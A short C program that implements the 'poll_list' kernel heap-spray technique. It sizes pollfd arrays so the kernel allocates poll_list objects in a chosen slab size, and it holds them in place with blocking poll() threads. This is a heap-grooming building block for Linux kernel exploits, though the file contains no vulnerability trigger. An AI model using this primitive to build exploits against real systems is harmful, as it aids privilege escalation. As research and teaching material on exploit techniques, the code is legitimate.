#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define N_STACK_PPS 30
#define POLLFD_PER_PAGE 510
#define POLL_LIST_SIZE 16
#define PAGE_SIZE 0x1000
int NFDS(int size) {
  return ((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS;
}

pthread_t poll_tid[0x1000];
size_t poll_threads;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int fds[0x5000];

struct poll_list {
  struct poll_list *next;
  int len;
  struct pollfd entries[];
};

struct t_args {
  int id;
  int nfds;
  int timeout;
};

void *alloc_poll_list(void *args) {
  struct pollfd *pfds;
  int nfds, timeout, id;

  id = ((struct t_args *)args)->id;
  nfds = ((struct t_args *)args)->nfds;
  timeout = ((struct t_args *)args)->timeout;

  pfds = calloc(nfds, sizeof(struct pollfd));

  for (int i = 0; i < nfds; i++) {
    pfds[i].fd = fds[0];
    pfds[i].events = POLLERR;
  }

  pthread_mutex_lock(&mutex);
  poll_threads++;
  pthread_mutex_unlock(&mutex);

  // printf("[Thread %d] Start polling...\n", id);
  int ret = poll(pfds, nfds, timeout);
  // printf("[Thread %d] Polling complete: %d!\n", id, ret);
}

void create_poll_thread(int id, size_t size, int timeout) {
  struct t_args *args;

  args = calloc(1, sizeof(struct t_args));

  if (size > PAGE_SIZE)
    size = size - ((size / PAGE_SIZE) * sizeof(struct poll_list));

  args->id = id;
  args->nfds = NFDS(size);
  args->timeout = timeout;

  pthread_create(&poll_tid[id], 0, alloc_poll_list, (void *)args);
}

void join_poll_threads(void) {
  for (int i = 0; i < poll_threads; i++)
    pthread_join(poll_tid[i], NULL);

  poll_threads = 0;
}

void main() {
  for (int i = 0; i < 0x200; i++) {
    fds[i] = open("/etc/passwd", O_RDONLY);
  }
  for (int i = 0; i < 8; i++)
    create_poll_thread(i, 0x200, 3000);
  puts("end");
  sleep(9999);
}
